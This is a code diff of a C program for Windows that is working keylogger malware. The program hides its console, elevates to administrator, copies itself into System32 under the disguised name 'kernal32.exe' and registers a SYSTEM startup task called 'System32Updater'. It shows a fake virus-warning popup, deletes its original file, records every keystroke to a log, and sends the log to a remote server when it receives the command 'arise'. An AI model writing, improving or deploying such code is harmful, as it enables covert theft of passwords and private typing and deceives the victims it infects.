@@ -2,27 +2,43 @@
 #include <stdio.h>
 #include <string.h>
 #include <winsock2.h>
-#include <windows.h>
-
 
 #define SERVER_IP "192.168.1.14"  // Change this to the Linux server IP
 #define SERVER_PORT 2005
 #define BUF_SIZE 4096
 
-#define SYSTEM32_PATH "C:\\Windows\\System32\\kernal32.exe"
+#define LOG_FILE "log.txt"
+#define REGISTRY_KEY "Software\\MyUniqueAppName\\FirstRun"
 
 int connection = 0;
 SOCKET sock;
 HANDLE hMutex;
 struct sockaddr_in server;
+
+// Function prototypes
+DWORD WINAPI send_logs(LPVOID lpBuffer);
+void refresh_connection();
+DWORD WINAPI connect_to_server(LPVOID arg);
+void save_to(const char *filename, const char *message);
+char map_special_shifted(int key);
+void add_to_registry();
+void copy_to_system32();
+void delete_original_executable();
+int is_first_run();
+void mark_as_run();
+BOOL IsRunningAsAdmin();
+void RelaunchAsAdmin();
+void ExecuteFromSystem32();
+void DeleteOriginalFile();
+
+// Thread function to send logs to the server
 DWORD WINAPI send_logs(LPVOID lpBuffer) {
     FILE *fp;
-    char *filename = "log.txt";
     char buffer[BUF_SIZE];
     int bytes_sent;
     SOCKET sock = *(SOCKET*)lpBuffer;
 
-    if ((fp = fopen(filename, "r")) == NULL) {
+    if ((fp = fopen(LOG_FILE, "r")) == NULL) {
         printf("Error opening file\n");
         return -1;
     }
@@ -30,63 +46,57 @@ DWORD WINAPI send_logs(LPVOID lpBuffer) {
         send(sock, buffer, bytes_sent, 0);
     }
     fclose(fp);
-    
     return 1;
 }
 
-
+// Function to refresh the connection to the server
 void refresh_connection() {
-    while(1){
+    while (1) {
         closesocket(sock);
         sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         server.sin_family = AF_INET;
         server.sin_addr.s_addr = inet_addr(SERVER_IP);
         server.sin_port = htons(SERVER_PORT);
         int retries = 10;
-        while(connect(sock, (struct sockaddr *)&server, sizeof(server))){
-            if(!retries--) continue;
+        while (connect(sock, (struct sockaddr *)&server, sizeof(server))) {
+            if (!retries--) continue;
             Sleep(5000); // Wait 5 seconds before trying again
         }
         return;
     }
 }
 
-
+// Thread function to connect to the server
 DWORD WINAPI connect_to_server(LPVOID arg) {
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
     char buffer[BUF_SIZE];
-    hMutex = CreateMutex(NULL,FALSE,NULL);
+    hMutex = CreateMutex(NULL, FALSE, NULL);
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = inet_addr(SERVER_IP);
     server.sin_port = htons(SERVER_PORT);
-    // connect(sock, (struct sockaddr *)&server, sizeof(server));
-    HANDLE recieve, refresh_conn;
-    // refresh_conn = CreateThread(NULL, 0, refresh_connection, NULL, NULL, NULL);
-    int len = 0;
-    while(1 > 0) {
 
-        // Then, modify your recv() call to handle the non-blocking behavior
-        if((len = recv(sock, buffer, sizeof(buffer), 0)) <= 0){
+    while (1) {
+        int len = recv(sock, buffer, sizeof(buffer), 0);
+        if (len <= 0) {
             refresh_connection();
             continue;
         }
         buffer[len] = '\0';
         if (strcmp(buffer, "arise") == 0) {
-            recieve = CreateThread(NULL, 0, send_logs, &sock, NULL, NULL);
+            CreateThread(NULL, 0, send_logs, &sock, 0, NULL);
         }
     }
-        // Cleanup
+
     closesocket(sock);
     WSACleanup();
     return 1;
 }
-// Function to save logs to a file
-HANDLE fileMutex;
 
+// Function to save logs to a file
 void save_to(const char *filename, const char *message) {
-    WaitForSingleObject(fileMutex, INFINITE);
+    WaitForSingleObject(hMutex, INFINITE);
     FILE *fp = fopen(filename, "a");
     if (fp) {
         fprintf(fp, "%s", message);
@@ -94,10 +104,8 @@ void save_to(const char *filename, const char *message) {
     } else {
         printf("Error opening file: %s\n", strerror(errno));
     }
-    ReleaseMutex(fileMutex);
+    ReleaseMutex(hMutex);
 }
-
-
 
 // Map special keys with Shift pressed
 char map_special_shifted(int key) {
@@ -125,89 +133,76 @@ char map_special_shifted(int key) {
         default: return '\0';
     }
 }
+
+// Add the program to the registry for persistence
 void add_to_registry() {
     HKEY hKey;
     char path[MAX_PATH];
 
-    // Get the full path of the current executable
     if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
         return;
     }
 
-    // Open the registry key where startup programs are listed
-    if (RegCreateKeyEx(HKEY_CURRENT_USER, 
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-
-        // Add the program path to the registry
+    if (RegCreateKeyEx(HKEY_CURRENT_USER, REGISTRY_KEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         RegSetValueEx(hKey, "kernal32", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
         RegCloseKey(hKey);
     }
 }
-// Function to copy the executable to System32 folder// Function to copy the executable to System32 folder
-void copy_to_system32() {
-    char path[MAX_PATH];
-    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
-        return;
-    }
 
-    // Path to copy the file into System32
-    char destination[MAX_PATH] = "C:\\Windows\\System32\\";
-    strcat(destination, "kernal32.exe"); // Change filename if needed
-
-    // Copy file to System32
-    if (CopyFile(path, destination, FALSE) == 0) {
-        printf("Error copying file: %lu\n", GetLastError());
-    }
-}
-
-// Function to show a fake popup
-void show_fake_popup() {
-    MessageBox(NULL, "Your system has detected a potentially harmful file.\nThis file will be deleted for safety.", "Warning", MB_ICONWARNING | MB_OK);
-}
-
-// Function to delete the executable from Desktop
-void delete_original_executable() {
-    char path[MAX_PATH];
-    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
-        return;
-    }
-
-    // Delete the file from the desktop (or wherever it was initially located)
-    if (DeleteFile(path) == 0) {
-        printf("Error deleting file: %lu\n", GetLastError());
-    }
-}
-
-// Check if it is the first run by checking a registry key
+// Check if it is the first run
 int is_first_run() {
     HKEY hKey;
-    DWORD dwType = 0;
-    DWORD dwSize = sizeof(DWORD);
     DWORD dwValue = 0;
+    DWORD dwSize = sizeof(DWORD);
 
-    // Open the registry key for tracking first run
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\MyApp\\FirstRun", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        if (RegQueryValueEx(hKey, "IsFirstRun", NULL, &dwType, (LPBYTE)&dwValue, &dwSize) == ERROR_SUCCESS) {
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, REGISTRY_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        if (RegQueryValueEx(hKey, "IsFirstRun", NULL, NULL, (LPBYTE)&dwValue, &dwSize) == ERROR_SUCCESS) {
             RegCloseKey(hKey);
-            return dwValue == 1 ? 0 : 1; // Not first run if value is 1
+            return dwValue == 1 ? 0 : 1;
         }
         RegCloseKey(hKey);
     }
-
-    // If not found in registry, it's the first run
     return 1;
 }
 
-// Mark the application as run so that subsequent runs won't trigger first run behavior
-void mark_as_run() {
-    HKEY hKey;
-    DWORD dwValue = 1;
-    RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\MyApp\\FirstRun", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
-    RegSetValueEx(hKey, "IsFirstRun", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(dwValue));
-    RegCloseKey(hKey);
+#define SYSTEM32_PATH "C:\\Windows\\System32\\kernal32.exe"
+
+BOOL IsRunningFromSystem32() {
+    char path[MAX_PATH];
+    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
+        return FALSE;
+    }
+    return stricmp(path, SYSTEM32_PATH) == 0;
 }
 
+void CopyToSystem32AndScheduleTask() {
+    char path[MAX_PATH];
+    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
+        return;
+    }
+
+    char command[MAX_PATH * 2];
+    snprintf(command, sizeof(command), "copy /Y \"%s\" \"%s\"", path, SYSTEM32_PATH);
+    system(command);
+
+
+    snprintf(command, sizeof(command), 
+        "schtasks /create /tn \"System32Updater\" /tr \"%s\" /sc ONSTART /RL HIGHEST /RU SYSTEM /F", 
+        SYSTEM32_PATH);
+    system(command);
+
+}
+
+void DeleteOriginalFile() {
+    char path[MAX_PATH];
+    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
+        return;
+    }
+
+    char command[MAX_PATH * 2];
+    snprintf(command, sizeof(command), "timeout /t 3 & del /F /Q \"%s\"", path);
+    system(command);
+}
 BOOL IsRunningAsAdmin() {
     BOOL isAdmin = FALSE;
     HANDLE hToken = NULL;
@@ -239,104 +234,72 @@ void RelaunchAsAdmin() {
     }
 }
 
-// Function to execute the file from System32
-void ExecuteFromSystem32() {
-    // Execute the file in System32 using ShellExecute
-    if (ShellExecute(NULL, "open", SYSTEM32_PATH, NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {
-        printf("Failed to execute file from System32.\n");
-    } else {
-        printf("File executed successfully from System32.\n");
-    }
-}
-
-void DeleteOriginalFile() {
+void show_fake_popup() {
     char path[MAX_PATH];
+    GetModuleFileNameA(NULL, path, MAX_PATH);
 
-    // Get full executable path
-    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
-        printf("Failed to get module file name\n");
-        return;
-    }
+    // The error message
+    const char *errorMessage = "Operation did not complete successfully because the file contains a virus or potentially unwanted software.";
 
-    // Construct the command to terminate the process and delete the file
-    char command[MAX_PATH * 2];
-    snprintf(command, sizeof(command),
-             "taskkill /F /IM \"%s\" && del /F /Q \"%s\"", strrchr(path, '\\') + 1, path);
+    // Display the message box
+    MessageBox(
+        NULL, // No owner window
+        errorMessage, // Message body
+        path, // Title of the message box
+        MB_ICONERROR | MB_OK // Error icon and OK button
+    );
 
-    // Execute the command
-    system(command);
+    return;
 }
-
 int main() {
-    
-    HWND hwnd = GetConsoleWindow(); 
-    ShowWindow(hwnd, SW_HIDE); // Hide the window for stealth
-    
-    fileMutex = CreateMutex(NULL, FALSE, NULL);
-        // Check if it is the first run
-    if (is_first_run()) {
-        // Copy to System32 folder
-        // Check if the program is running as administrator
-        if (!IsRunningAsAdmin()) {
-        // Relaunch the program as administrator if not running as admin
+    HWND hwnd = GetConsoleWindow(); // Get the console window handle
+    ShowWindow(hwnd, SW_HIDE);      // Hide the window
+    if (!IsRunningFromSystem32()) {
+        if(!IsRunningAsAdmin()){
             RelaunchAsAdmin();
             return 0;
         }
 
-    // Once we have elevated privileges:
-    // 1. Execute the file from System32
-        add_to_registry();
-        copy_to_system32();
+        CopyToSystem32AndScheduleTask();
         show_fake_popup();
-        ExecuteFromSystem32();
-    // 2. Delete the original file from Desktop (or wherever it was located)
         DeleteOriginalFile();
-         mark_as_run();
-        // Show fake pop-up
-        // Mark as run in the registry so it won't trigger on subsequent runs
-        // Ensure the program runs on startup by adding it to the registry
+        return 0;
     }
+        // mark_as_run();
+    add_to_registry();
+    // Start the keylogger and server connection
+    CreateThread(NULL, 0, connect_to_server, NULL, 0, NULL);
 
-    char message[1024];       // Buffer for logging messages
-    int lastKeyState[256] = {0}; // Array to track key states
-    CreateThread(NULL, NULL,connect_to_server, NULL, 0, NULL);
+    char message[1024];
+    int lastKeyState[256] = {0};
+
     while (1) {
         for (int i = 0; i < 256; i++) {
-            // Check if key is pressed
             if (GetAsyncKeyState(i) & 0x0001) {
-                // Skip noisy keys that are not typically used
-                if (i < 8 || i > 254) continue;
-
-                // Handle alphanumeric keys
+                // Handle keypresses and save to log file
                 if (i >= 'A' && i <= 'Z') {
                     int capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);
                     int shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000);
 
-                    if (capsLock ^ shiftPressed) { // XOR to determine letter case
-                        snprintf(message, sizeof(message), "%c", i); // Uppercase
+                    if (capsLock ^ shiftPressed) {
+                        snprintf(message, sizeof(message), "%c", i);
                     } else {
-                        snprintf(message, sizeof(message), "%c", i + 32); // Lowercase
+                        snprintf(message, sizeof(message), "%c", i + 32);
                     }
-                }
-                // Handle numbers and special characters
-                else if (i >= '0' && i <= '9') {
+                } else if (i >= '0' && i <= '9') {
                     if (GetKeyState(VK_SHIFT) & 0x8000) {
                         char shiftedChar = map_special_shifted(i);
                         if (shiftedChar != '\0') {
                             snprintf(message, sizeof(message), "%c", shiftedChar);
                         } else {
-                            snprintf(message, sizeof(message), "%c", i); // Default number
+                            snprintf(message, sizeof(message), "%c", i);
                         }
                     } else {
-                        snprintf(message, sizeof(message), "%c", i); // Default number
+                        snprintf(message, sizeof(message), "%c", i);
                     }
-                }
-                // Handle spacebar
-                else if (i == VK_SPACE) {
+                } else if (i == VK_SPACE) {
                     strcpy(message, " ");
-                }
-                // Handle special keys
-                else {
+                } else {
                     switch (i) {
                         case VK_RETURN:  strcpy(message, " [Enter] "); break;
                         case VK_BACK:    strcpy(message, " [Backspace] "); break;
@@ -353,14 +316,11 @@ int main() {
                         case VK_HOME:    strcpy(message, " [Home] "); break;
                         case VK_END:     strcpy(message, " [End] "); break;
                         case VK_DELETE:  strcpy(message, " [Del] "); break;
-                        default:
-                            snprintf(message, sizeof(message), " [Unknown: %d] ", i);
-                            break;
+                        default: snprintf(message, sizeof(message), " [Unknown: %d] ", i); break;
                     }
                 }
 
-                // Save the keypress to the log file
-                save_to("log.txt" , message);
+                save_to(LOG_FILE, message);
             }
         }
         Sleep(10); // Reduce CPU usage
@@ -368,4 +328,3 @@ int main() {
 
     return 0;
 }
-
